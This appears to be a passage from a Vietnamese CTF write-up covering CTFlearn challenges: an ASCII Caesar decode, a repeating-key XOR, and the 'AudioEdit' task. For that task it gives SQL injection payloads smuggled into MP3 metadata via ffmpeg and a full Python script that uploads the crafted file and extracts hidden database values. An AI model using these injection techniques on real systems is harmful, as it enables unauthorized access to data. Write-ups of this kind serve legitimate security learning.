- Rồi được 1 đoạn khá dài. Với 3 cái pha ke flag thì ta có 1 đoạn kí tự, bỏ dòng đầu tiên đưa vào base 64 thì chỉ là phần script thôi.
- Với dòng `42m{y!"%w2'z{&o2UfX~ws%!._s+{ (&@Vwu{ (&@_w%{v{(&0` sẽ là cái cần xử lý. Vì đề đã gợi ý ceaser và có cái 32 và 126 thì ta biết được đây sẽ ceasar decode bằng ascii.
- Đoạn mã tham khảo:
    ```
    def ascii_caesar_shift(message, distance):
        encrypted = ""
        for char in message:
            a = ord(char)
            value = ord(char) + distance
            if value <= 33:  # non-printable characters in ascii
                value -= 33
            encrypted += chr(value % 128)  # 128 for ASCII
        return encrypted


    mess = '42m{y!"%w2''z{&o2UfX~ws%!._s+{ (&@Vwu{ (&@_w%{v{(&0'
    print(ascii_caesar_shift(mess, -18))
    ```

## XOR Is Friend Not Food
- Bài này khá là đơn giản với gợi ý thì ta chỉ cần xor 2 xâu với nhau rồi kiểm tra.
- Coi xâu đầu là s1 và flag thì ta có s1 xor flag = key.
- Những kí tự ban đầu của key sẽ là `jowlsjowl` sau khi xor. Đoán thử thì đây sẽ là 1 xâu lặp dạng `jowlsjowlsjowlsjowlsjowlsjowls`. 
- Lấy key xor s1 = flag.

## AudioEdit
- Đây là 1 dạng bài về meta injection.
- Khi gặp 1 bài gửi file như này thì khả năng khá cao là sẽ làm về việc upload file có chứa mã độc rồi.
- Và ta có thể thấy được là khi upload file lên sẽ có 2 trường Author và title thì chúng ta sẽ tận dụng 2 trường này để trèn mã độc.
- Có thể dùng một vài công cụ để thêm metadata vào trong file .mp3 của chúng ta. Ví dụ:
    ```
    ffmpeg -i in.mp3 -metadata author=\"Hehe\" -metadata title=\"heHe\" out.mp3
    ```
- Và khi upload file này lên thì ta sẽ thấy được cái title và author của mình.
- Well tình hình là chỉ có title chứ ko biết metadata của author là cái gì :)) thế thì tận dụng title vậy.
- Vì ở đây khi ta cho linh tinh vào phần file trên url `https://web.ctflearn.com/audioedit/edit.php?file=hehe.mp3` thì ta sẽ ra 1 dòng là `Error fetching audio file from DB!` vậy chắc hẳn đang liên quan tới database và sẽ là sql injection.
- Vậy việc chúng ta cần làm ở đấy là viết 1 đoạn mã sao cho lấy ra được cái mình cần.
- Ròi giờ thì viết cái gì và tại sao lại viết như thế.
    - Giờ ta sẽ phải kiểm tra xem câu lệnh được thực hiện ở đây là gì. Thử cho mấy cái kí tự đặc biệt vào phần title `ffmpeg -i in.mp3 -metadata author="Hehe" -metadata title="'()<>" out.mp3 ` thì ta nhận được thông báo là `Error inserting into database!` thì chắc chắn là insert rồi và nó sẽ có dạng là ` insert into table values('','').
    - Đến đây ta sẽ chèn mã vào nhưng mà bằng python cho dễ :)).
    - Ta có thể chèn câu lệnh `"',(SHOW TABLES FROM audioedit)) --   "` vào để kiểm tra tên của DB nhưng mà chẳng có cách nào để lấy được tên bảng. Vậy nên ta sẽ ... đoán bừa :v và đoán vừa ở đây tên bảng sẽ là audioedit và ta có truy vấn `"',(select title from audioedit as hehe limit 1)) --   "` và ta có title là `flag` khá hữu dụng chứ nhỉ :)).
    - Gòi có tên của bảng rồi giờ lấy dữ liệu ra thôi.
    - Để ý kĩ thì có thể thấy url có phần file= gì gì đó thì có thể là tên cột lưu trữ 
cái mà mình upload lên sẽ có tên là file, thử vào ta được `supersecretflagf1le.mp3`. 
    - ** Tại sao lại lần file: Thì đơn giản là file mp3 mà nó có phần Visualisation thì khả năng là sẽ thấy flag qua đó chứ không ngta để đó làm gì :)).
    - Tới đây chỉ cần thêm phần flag vào file là ra `https://web.ctflearn.com/audioedit/edit.php?file=ec8557875edb4b19639d77a06ceb0eedf3c60dee.mp3`
    - Nhưng mà do bài này đã được tải lên từ rất rất lâu rồi nên có nhiều thay đổi trong công nghệ làm file bị lỗi nên ta sẽ không thể xem dduocj wflag nhưng ta có thể tải file về để check bằng lệnh `wget https://web.ctflearn.com/audioedit/uploads/supersecretflagf1le.mp3` và kiểm tra spectrum ở một trang web nào đó rồi điền flag thôi.
- Đoạn mã tham khảo:
    ```
    import requests, os, string, random

    sql="',(select file from audioedit as hehe limit 1)) --   "

    ra = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

    # Nếu bạn cần thêm metadata (SQL injection giả lập), có thể thử
    os.system("ffmpeg -i in.mp3 -metadata artist=\"" + sql + "\" -metadata title=\"" + ra + "\" out.mp3")
    with open('out.mp3', 'rb') as audio_file:
        r = requests.post(
            "https://web.ctflearn.com/audioedit/submit_upload.php",
            files={'audio': audio_file},
            allow_redirects=False
        )

    # Xóa tệp output sau khi sử dụng
    os.remove("out.mp3")

    # Kiểm tra xem header có chứa 'location' hay không
    location = r.headers.get('location')
    if location:
        r = requests.get('https://web.ctflearn.com/audioedit' + location[1:])
        t = r.text.split('<h5>Title: <small>')
        t = t[1].split('</small>')
        k = t[0]
        print(k)
    else:
        print("No redirect found")

    ```